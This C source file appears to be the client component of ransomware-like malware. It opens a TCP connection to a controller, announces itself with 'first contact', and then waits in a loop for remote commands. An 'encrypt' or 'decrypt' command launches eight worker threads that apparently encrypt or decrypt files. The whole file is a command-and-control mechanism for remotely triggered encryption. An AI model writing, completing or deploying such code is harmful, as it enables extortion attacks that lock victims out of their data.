#include <stdbool.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdlib.h>

#include "../../headers/client.h"
#include "../../headers/thread.h"
#define PORT 8080

void *commands_listener(void *arg) {
    int client_fd = *(int *)arg;
    free(arg);

    char buffer[1024];

    while (true){
        int valread = read(client_fd, buffer, sizeof(buffer) -1);

        if (valread > 0 ) {
            buffer[valread] = '\0';
            char *arguments[10] = {0};  // zero-initialize so unused slots are NULL
            int argc = 0;

            char *token = strtok(buffer, ";");
            while (token != NULL && argc < 10) {
                arguments[argc++] = token;
                token = strtok(NULL, ";");
            }

            if (strcmp(arguments[0], "encrypt") == 0) {
                printf("start_encryption\n");
                initialize_threads(8, true);
            } else if (strcmp(arguments[0], "decrypt") == 0) {
                printf("start_decryption\n");
                initialize_threads(8, false);
            } else {
                for (int i = 0; i < argc; i++) {
                    printf("%s\n", arguments[i]);
                }
            }
        }
    }
}

int startclient() {
    int status;
    int valread;
    int client_fd;

    struct sockaddr_in serv_addr;

    if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("socket creation failed\n");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) { //127.0.0.1 //10.172.20.145
        printf("inet_pton failed\n");
        return -1;
    }
    if ((status = connect(client_fd, (struct sockaddr *) &serv_addr, sizeof(serv_addr))) < 0) {
        printf("connect failed\n");
        return -1;
    }
    char* hey = "first contact";
    send(client_fd, hey, strlen(hey), 0);

    int *clientfd = malloc(sizeof(int));
    *clientfd = client_fd;

    pthread_t command_tid;
    pthread_create(&command_tid, NULL, commands_listener, clientfd);
    pthread_join(command_tid, NULL);
}